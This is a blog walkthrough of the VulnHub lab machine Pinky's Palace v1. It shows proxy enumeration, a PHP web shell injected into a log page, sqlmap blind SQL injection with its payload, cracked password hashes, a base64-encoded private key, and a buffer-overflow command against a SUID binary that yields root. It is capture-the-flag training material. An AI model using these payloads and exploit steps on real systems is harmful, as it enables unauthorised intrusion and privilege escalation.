---
title: VulnHub - Pinky's Palace v1
author: ret2x
date: 2021-11-01 21:45:00 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, sqli, bof]
image:
    path: /assets/images/pinkys1/front.png
---

**Description:** A linux machine which requires to enumerate via a squid web proxy in order to interact with a web application vulnerable to SQL Injection. Inappropriate practices and buffer overflow exploitation granted root privileges.

**Author:** Pink_Panther

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/pinkys-palace-v1,225/](https://www.vulnhub.com/entry/pinkys-palace-v1,225/)

## Information Gathering
### Host Discovery

An ARP scan discovered the target machine on the local network.

```console
root@kali:~$ arp-scan -I vmnet1 192.168.179.1/24
Interface: vmnet1, type: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.179.160 08:00:27:9d:75:ee       PCS Systemtechnik GmbH
192.168.179.254 00:50:56:ee:6f:45       VMware, Inc.
```

### Port Scanning

With nmap I did a full TCP port scan, this identified three available ports.

```console
root@kali:~$ nmap -v -n -p- -T5 192.168.179.160 -oG nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
8080/tcp  open  http-proxy
31337/tcp open  Elite
64666/tcp open  unknown
```

### Service Enumeration

I performed service enumeration and script scanning to the target machine.

```console
root@kali:~$ nmap -v -n -p8080,31337,64666 -sV -sC 192.168.179.160 -oN nmap/service-enum.txt
...
PORT      STATE SERVICE    VERSION
8080/tcp  open  http       nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  http-proxy Squid http proxy 3.5.23
|_http-server-header: squid/3.5.23
|_http-title: ERROR: The requested URL could not be retrieved
64666/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 df:02:12:4f:4c:6d:50:27:6a:84:e9:0e:5b:65:bf:a0 (RSA)
|   256 0a:ad:aa:c7:16:f7:15:07:f0:a8:50:23:17:f3:1c:2e (ECDSA)
|_  256 4a:2d:e5:d8:ee:69:61:55:bb:db:af:29:4e:54:52:2f (ED25519)
```

### Squid Enumeration

The service on port 31337 is an http web proxy which provides proxy and cache services for Hyper Text Transport Protocol (HTTP), File Transfer Protocol (FTP), and other popular network protocols.

![](/assets/images/pinkys1/screenshot-1.png)

On port 8080 we can see that this service is forbidden.

![](/assets/images/pinkys1/screenshot-2.png)

There is a way to enumerate local services through aquid, the following curl instruction reveals that it gives us a status code 404 when I enumerted via the squid proxy the port 8080 using its external ip address.

```console
root@kali:~$ curl -s --proxy http://192.168.179.160:31337 http://192.168.179.160:8080
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.10.3</center>
</body>
</html>
```

So I tried to enumerate the port 8080 locally via the squid proxy, as we can see the response from the server is different.

```console
root@kali:~$ curl -s --proxy http://192.168.179.160:31337 http://127.0.0.1:8080      
<html>
        <head>
                <title>Pinky's HTTP File Server</title>
        </head>
        <body>
                <center><h1>Pinky's HTTP File Server</h1></center>
                <center><h3>Under Development!</h3></center>
        </body>
<style>
html{
        background: #f74bff;
}
</html>
```

To access on port 8080 locally, we need to set up a web proxy in the browser using the target ip and port 31337.

![](/assets/images/pinkys1/screenshot-3.png)

As we see the page was resolved correctly.

![](/assets/images/pinkys1/screenshot-4.png)

I ran gobuster to brute force and find hidden files and directories.

```console
root@kali:~$ gobuster dir -u http://127.0.0.1:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --proxy http://192.168.179.160:31337/
...
/littlesecrets-main   (Status: 301) [Size: 185] [--> http://127.0.0.1:8080/littlesecrets-main/]
```

A directory was found, so I accessed it and it redirected me to a login page, I tried to log in with common creds but nothing, apparently login attempts are logged somewhere.

![](/assets/images/pinkys1/screenshot-5.png)

![](/assets/images/pinkys1/screenshot-6.png)

![](/assets/images/pinkys1/screenshot-7.png)

I decided run again gobuster to find any resource under the littlesecrets-main directory, the logs.php file looks interesting.

```console
root@kali:~$ gobuster dir -u http://127.0.0.1:8080/littlesecrets-main -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --proxy http://192.168.179.160:31337/  -x php,html,txt
...
/index.html           (Status: 200) [Size: 583]
/login.php            (Status: 200) [Size: 68] 
/logs.php             (Status: 200) [Size: 728790]
```

I injected it the logs file with a web shell, apparently the php code is not being interpreted.

![](/assets/images/pinkys1/screenshot-8.png)

```console
root@kali:~$ curl -s http://127.0.0.1:8080/littlesecrets-main/logs.php --proxy http://192.168.179.160:31337 | html2text -width 800 | tail -1
*** 39212 <?php system($_GET["cmd"])?> <?php system($_GET["cmd"])?> Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 ***
```

## Exploitation
### SQL Injection

To perform a more advanced test I used sqlmap against the login form, an SQL injection was detected in the User-Agent header.

```console
root@kali:~$ sqlmap -u 'http://127.0.0.1:8080/littlesecrets-main/login.php' --data 'user=pinky&pass=password' --proxy 'http://192.168.179.160:31337' --level 5 --risk 3 --threads 5 --dbms MYSQL
...
parameter 'User-Agent' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 8816 HTTP(s) requests:
---
Parameter: User-Agent (User-Agent)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sqlmap/1.5.7#stable (http://sqlmap.org)' AND (SELECT 4717 FROM (SELECT(SLEEP(5)))pGuK) AND 'ugVr'='ugVr
---
[20:47:08] [INFO] the back-end DBMS is MySQL
...
```

Listing the databases.

```console
root@kali:~$ sqlmap -u 'http://127.0.0.1:8080/littlesecrets-main/login.php' --data 'user=pinky&pass=password' --proxy 'http://192.168.179.160:31337' --level 5 --risk 3 --dbms MYSQL --dbs
...
available databases [2]:
[*] information_schema
[*] pinky_sec_db
```

Enumerating the tables from pinky_sec_db.

```console
root@kali:~$ sqlmap -u 'http://127.0.0.1:8080/littlesecrets-main/login.php' --data 'user=pinky&pass=password' --proxy 'http://192.168.179.160:31337' --level 5 --risk 3 --dbms MYSQL -D pinky_sec_db --tables
...
Database: pinky_sec_db
[2 tables]
+-------+
| logs  |
| users |
+-------+
```

Listing the columns from the users table.


```console
root@kali:~$ sqlmap -u 'http://127.0.0.1:8080/littlesecrets-main/login.php' --data 'user=pinky&pass=password' --proxy 'http://192.168.179.160:31337' --level 5 --risk 3 --dbms MYSQL -D pinky_sec_db -T users --columns
...
Database: pinky_sec_db
Table: users
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| user   | varchar(100) |
| pass   | varchar(100) |
| uid    | int(11)      |
+--------+--------------+
```

Retrieving the records from the users table.

```console
root@kali:~$ sqlmap -u 'http://127.0.0.1:8080/littlesecrets-main/login.php' --data 'user=pinky&pass=password' --proxy 'http://192.168.179.160:31337' --level 5 --risk 3 --dbms MYSQL -D pinky_sec_db -T users -C uid,user,pass --dump
...
Database: pinky_sec_db
Table: users
[2 entries]
+-----+-------------+----------------------------------+
| uid | user        | pass                             |
+-----+-------------+----------------------------------+
| 1   | pinky       | f543dbfeaf238729831a321c7a68bee4 |
| 2   | pinkymanage | d60dffed7cc0d87e1f4a11aa06ca73af |
+-----+-------------+----------------------------------+
```

I saved the password hashes to a file, cracked them and got the password from the pinkymanage user.

```console
root@kali:~$ echo -e "f543dbfeaf238729831a321c7a68bee4\nd60dffed7cc0d87e1f4a11aa06ca73af" > pinky.hashes


root@kali:~$ hashcat -a 0 -m 0 pinky.hashes rockyou.txt
...
d60dffed7cc0d87e1f4a11aa06ca73af:3pinkysaf33pinkysaf3 
```

I logged in via SSH as user **pinkymanage** with the password **3pinkysaf33pinkysaf3**.

```console
root@kali:~$ ssh -l pinkymanage 192.168.179.160 -p 64666
pinkymanage@192.168.179.160's password: 
Linux pinkys-palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb  2 04:00:51 2018 from 127.0.0.1
pinkymanage@pinkys-palace:~$ id
uid=1001(pinkymanage) gid=1001(pinkymanage) groups=1001(pinkymanage)
```

In the web directory I found the **.ultrasecret** file with a base64 encoded string.

```console
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ cat note.txt 
Hmm just in case I get locked out of my server I put this rsa key here.. Nobody will find it heh..

pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ cat .ultrasecret 
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBMTZmeEwzLyto
L0lMVFpld2t2ZWtoSVExeWswb0xJK3kzTjRBSXRraGV6MTFJaGE4CkhjN0tPeC9MOWcyamQzSDhk
R1BVZktLcjlzZXF0Zzk3WktBOTVTL3NiNHczUXRsMUFCdS9wVktaQmJHR3NIRy8KeUl2R0VQS1Mr
QlNaNHN0TVc3SG54N2NpTXVod2Nad0xxWm1zeVN1bUVDVHVlUXN3TlBibElUbHJxb2xwWUY4eApl
NDdFbDlwSHdld05XY0lybXFyYXhDSDVUQzdVaGpnR2FRd21XM3FIeXJTcXAvaksvY3RiMVpwblB2
K0RDODMzCnUvVHlqbTZ6OFJhRFpHL2dSQklyTUduTmJnNHBaRmh0Z2JHVk9mN2ZlR3ZCRlI4QmlU
KzdWRmZPN3lFdnlCeDkKZ3hyeVN4dTJaMGFPTThRUjZNR2FETWpZVW5COWFUWXV3OEdQNHdJREFR
QUJBb0lCQUE2aUg3U0lhOTRQcDRLeApXMUx0cU9VeEQzRlZ3UGNkSFJidG5YYS80d3k0dzl6M1Mv
WjkxSzBrWURPbkEwT1VvWHZJVmwvS3JmNkYxK2lZCnJsZktvOGlNY3UreXhRRXRQa291bDllQS9r
OHJsNmNiWU5jYjNPbkRmQU9IYWxYQVU4TVpGRkF4OWdrY1NwejYKNkxPdWNOSUp1eS8zUVpOSEZo
TlIrWVJDb0RLbkZuRUlMeFlMNVd6MnFwdFdNWUR1d3RtR3pPOTY4WWJMck9WMQpva1dONmdNaUVp
NXFwckJoNWE4d0JSUVZhQnJMWVdnOFdlWGZXZmtHektveEtQRkt6aEk1ajQvRWt4TERKcXQzCkxB
N0pSeG1Gbjc3L21idmFEVzhXWlgwZk9jUzh1Z3lSQkVOMFZwZG5GNmtsNnRmT1hLR2owZ2QrZ0Fp
dzBUVlIKMkNCN1BzRUNnWUVBOElXM1pzS3RiQ2tSQnRGK1ZUQnE0SzQ2czdTaFc5QVo2K2JwYitk
MU5SVDV4UkpHK0RzegpGM2NnNE4rMzluWWc4bUZ3c0Jobi9zemdWQk5XWm91V3JSTnJERXhIMHl1
NkhPSjd6TFdRYXlVaFFKaUlQeHBjCm4vRWVkNlNyY3lTZnpnbW50T2liNGh5R2pGMC93bnRqTWM3
M3h1QVZOdU84QTZXVytoZ1ZIS0VDZ1lFQTVZaVcKSzJ2YlZOQnFFQkNQK3hyQzVkSE9CSUVXdjg5
QkZJbS9Gcy9lc2g4dUU1TG5qMTFlUCsxRVpoMkZLOTJReDlZdgp5MWJNc0FrZitwdEZVSkxjazFN
MjBlZkFhU3ZPaHI1dWFqbnlxQ29mc1NVZktaYWE3blBRb3plcHFNS1hHTW95Ck1FRWVMT3c1NnNK
aFNwMFVkWHlhejlGUUFtdnpTWFVudW8xdCtnTUNnWUVBdWJ4NDJXa0NwU0M5WGtlT3lGaGcKWUdz
TE45VUlPaTlrcFJBbk9seEIzYUQ2RkY0OTRkbE5aaFIvbGtnTTlzMVlPZlJYSWhWbTBaUUNzOHBQ
RVZkQQpIeDE4ci8yRUJhV2h6a1p6bGF5ci9xR29vUXBwUkZtbUozajZyeWZCb21RbzUrSDYyVEE3
bUl1d3Qxb1hMNmM2Ci9hNjNGcVBhbmcyVkZqZmNjL3IrNnFFQ2dZQStBenJmSEZLemhXTkNWOWN1
ZGpwMXNNdENPRVlYS0QxaStSd2gKWTZPODUrT2c4aTJSZEI1RWt5dkprdXdwdjhDZjNPUW93Wmlu
YnErdkcwZ016c0M5Sk54SXRaNHNTK09PVCtDdwozbHNLeCthc0MyVng3UGlLdDh1RWJVTnZEck9Y
eFBqdVJJbU1oWDNZU1EvVUFzQkdSWlhsMDUwVUttb2VUSUtoClNoaU9WUUtCZ1FEc1M0MWltQ3hX
Mm1lNTQxdnR3QWFJcFE1bG81T1Z6RDJBOXRlRVBzVTZGMmg2WDdwV1I2SVgKQTlycExXbWJmeEdn
SjBNVmh4Q2pwZVlnU0M4VXNkTXpOYTJBcGN3T1dRZWtORTRlTHRPN1p2MlNWRHI2Y0lyYwpIY2NF
UCtNR00yZVVmQlBua2FQa2JDUHI3dG5xUGY4ZUpxaVFVa1dWaDJDbll6ZUFIcjVPbUE9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
```

## Privilege Escalation
### SSH Key Disclosure

This string contains a private key so I decoded it, and granted write privileges to it.

```console
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ cat .ultrasecret | base64 -d > /dev/shm/id_rsa
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ chmod 400 /dev/shm/id_rsa 
```

In the compromised machine I logged in as user pinky via SSH using the private key.
 
```console
pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ ssh pinky@127.0.0.1 -p 64666 -i /dev/shm/id_rsa 
Linux pinkys-palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb  2 05:54:01 2018 from 172.19.19.2
pinky@pinkys-palace:~$ id
uid=1000(pinky) gid=1000(pinky) groups=1000(pinky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

In the pinky's home directory I found a note and a binary file with SUID permissions.

```console
pinky@pinkys-palace:~$ ls
adminhelper  note.txt
pinky@pinkys-palace:~$ ls -la adminhelper 
-rwsr-xr-x 1 root root 8880 Feb  2  2018 adminhelper
pinky@pinkys-palace:~$ cat note.txt 
Been working on this program to help me when I need to do administrator tasks sudo is just too hard to configure and I can never remember my root password! Sadly I'm fairly new to C so I was working on my printing skills because Im not sure how to implement shell spawning yet :(
pinky@pinkys-palace:~$ file adminhelper 
adminhelper: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3f035a0120e92e5c0e569dc8f3f4e813ef41409b, not stripped
```

### SUID Binary

I check if gdb exists to debug the binary, luckily it is installed on the system and start listing the existing functions.

```console
pinky@pinkys-palace:~$ whereis gdb
gdb: /usr/bin/gdb /etc/gdb /usr/include/gdb /usr/share/gdb

pinky@pinkys-palace:~$ gdb -q ./adminhelper 
Reading symbols from ./adminhelper...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000000618  _init
0x0000000000000640  strcpy@plt
0x0000000000000650  puts@plt
0x0000000000000660  execve@plt
0x0000000000000670  setegid@plt
0x0000000000000680  seteuid@plt
0x00000000000006a0  _start
0x00000000000006d0  deregister_tm_clones
0x0000000000000710  register_tm_clones
0x0000000000000760  __do_global_dtors_aux
0x00000000000007a0  frame_dummy
0x00000000000007d0  spawn
0x0000000000000813  main
0x0000000000000860  __libc_csu_init
0x00000000000008d0  __libc_csu_fini
0x00000000000008d4  _fini
```

In the output we can see a spawn function, this one catches my attention, I added a breakpoint in the main function, ran it, and jumped to the spawn function and a dash shell was executed, but we aren't root.

```console
(gdb) break main
Breakpoint 1 at 0x817
(gdb) run
Starting program: /home/pinky/adminhelper 

Breakpoint 1, 0x0000555555554817 in main ()
(gdb) jump spawn
Continuing at 0x5555555547d4.
process 2365 is executing new program: /bin/dash
Error in re-setting breakpoint 1: Function "main" not defined.
$ whoami
pinky
```

To escalate to root, we need to run our malicious instructions outside of gdb, so I run the binary with 500 characters to provoke a crash.

```console
(gdb) run $(python -c 'print("A"*500)')  
Starting program: /home/pinky/adminhelper $(python -c 'print("A"*500)')
                                                           
Program received signal SIGSEGV, Segmentation fault.      
next_env_entry (position=<optimized out>) at arena.c:220     
220     arena.c: No such file or directory.
```

Then, I could find the offset in 72 bytes and overwrite the rip instruction with 6 B's (42 in hexadecimal).

```console
(gdb) run $(python -c 'print("A"*72 + "B"*6)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/pinky/adminhelper $(python -c 'print("A"*72 + "B"*6)')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()
```

As we can verify, the rip instruction was controlled.

```console
(gdb) info registers $rip
rip            0x424242424242   0x424242424242
```

Is time to disassemble the spawn function to locate its address.

```console
(gdb) disas spawn
Dump of assembler code for function spawn:
   0x00005555555547d0 <+0>:     push   %rbp
   0x00005555555547d1 <+1>:     mov    %rsp,%rbp
   0x00005555555547d4 <+4>:     sub    $0x10,%rsp
   0x00005555555547d8 <+8>:     movl   $0x0,-0x4(%rbp)
   0x00005555555547df <+15>:    movl   $0x0,-0x8(%rbp)
   0x00005555555547e6 <+22>:    mov    -0x4(%rbp),%eax
   0x00005555555547e9 <+25>:    mov    %eax,%edi
   0x00005555555547eb <+27>:    callq  0x555555554680 <seteuid@plt>
   0x00005555555547f0 <+32>:    mov    -0x8(%rbp),%eax
   0x00005555555547f3 <+35>:    mov    %eax,%edi
   0x00005555555547f5 <+37>:    callq  0x555555554670 <setegid@plt>
   0x00005555555547fa <+42>:    mov    $0x0,%edx
   0x00005555555547ff <+47>:    mov    $0x0,%esi
   0x0000555555554804 <+52>:    lea    0xd9(%rip),%rdi        # 0x5555555548e4
   0x000055555555480b <+59>:    callq  0x555555554660 <execve@plt>
   0x0000555555554810 <+64>:    nop
   0x0000555555554811 <+65>:    leaveq 
   0x0000555555554812 <+66>:    retq   
End of assembler dump.
```

The address to add in the rip register is **0x00005555555547d0**, so I built the final instruction, assigning first with 71 A's, and the jump address to the spawn function in little endian.

```console
pinky@pinkys-palace:~$ /home/pinky/adminhelper $(python -c 'print("A"*72 + "\xd0\x47\x55\x55\x55\x55")')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGUUUU
# whoami
root
# python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
root@pinkys-palace:/home/pinky# cd /root
root@pinkys-palace:/root# ls
root.txt
root@pinkys-palace:/root# cat root.txt 
===========[!!!CONGRATS!!!]===========

[+] You r00ted Pinky's Palace Intermediate!
[+] I hope you enjoyed this box!
[+] Cheers to VulnHub!
[+] Twitter: @Pink_P4nther

Flag: 99975cfc5e2eb4c199d38d4a2b2c03ce
```

